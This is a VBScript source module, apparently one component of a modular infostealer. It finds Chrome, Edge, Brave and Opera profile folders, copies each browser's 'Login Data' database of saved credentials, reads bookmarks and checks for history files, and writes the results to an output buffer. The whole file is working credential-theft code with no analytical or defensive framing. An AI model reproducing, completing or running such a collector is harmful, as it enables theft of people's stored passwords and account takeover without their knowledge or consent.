' chunk: collectors/browser_chromium
' depends: core/emit_buffer, core/run_cmd, core/file_ops
' provides: collect_browser_chromium
' format: vbscript

Sub collect_browser_chromium()
    emit vbCrLf & "=== BROWSER DATA ===" & vbCrLf
    Dim localApp, appData, browsers, paths, i
    localApp = _s.ExpandEnvironmentStrings("%LOCALAPPDATA%")
    appData = _s.ExpandEnvironmentStrings("%APPDATA%")
    browsers = Array("Chrome", "Edge", "Brave", "Opera")
    paths = Array( _
        localApp & "\Google\Chrome\User Data", _
        localApp & "\Microsoft\Edge\User Data", _
        localApp & "\BraveSoftware\Brave-Browser\User Data", _
        appData & "\Opera Software\Opera Stable" _
    )
    For i = 0 To UBound(browsers)
        If _fso.FolderExists(paths(i)) Then
            emit "  " & browsers(i) & ": INSTALLED at " & paths(i) & vbCrLf
            Dim loginDb, histDb, bookmarks
            loginDb = paths(i) & "\Default\Login Data"
            histDb = paths(i) & "\Default\History"
            bookmarks = paths(i) & "\Default\Bookmarks"
            If file_exists_f(loginDb) Then
                emit "    Login Data: EXISTS (" & _fso.GetFile(loginDb).Size & " bytes)" & vbCrLf
                Dim copied
                copied = grab_file(loginDb, "login_" & LCase(browsers(i)))
                If Len(copied) > 0 Then emit "    [LOGIN_DB copied: " & Len(copied) & " bytes]" & vbCrLf
            End If
            If file_exists_f(histDb) Then emit "    History: EXISTS" & vbCrLf
            If file_exists_f(bookmarks) Then
                Dim bk
                bk = read_file(bookmarks, 65536)
                If Len(bk) > 0 Then emit "    Bookmarks: " & Len(bk) & " bytes" & vbCrLf
            End If
        End If
    Next
End Sub
